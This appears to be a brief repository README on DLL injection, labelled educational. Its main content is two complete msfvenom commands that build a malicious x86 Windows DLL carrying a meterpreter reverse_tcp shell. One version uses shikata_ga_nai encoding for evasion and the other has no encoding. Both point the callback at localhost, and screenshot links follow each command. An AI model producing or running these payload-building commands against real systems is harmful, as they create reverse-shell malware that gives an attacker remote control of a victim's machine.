# DLL-Injection
simple DLL Injection; made for educational purposes

### crafiting a x86 malicious DLL with sgnx86 enconding
> msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai -f dll -o dll_sgnx86.dll
![alt text](https://prnt.sc/Ugw0YYoNloYf)

### crafiting a x86 malicious DLL without enconding
> msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -f dll -o dll_x86.dll
![alt text](https://prnt.sc/1NASfSzKtYnT)
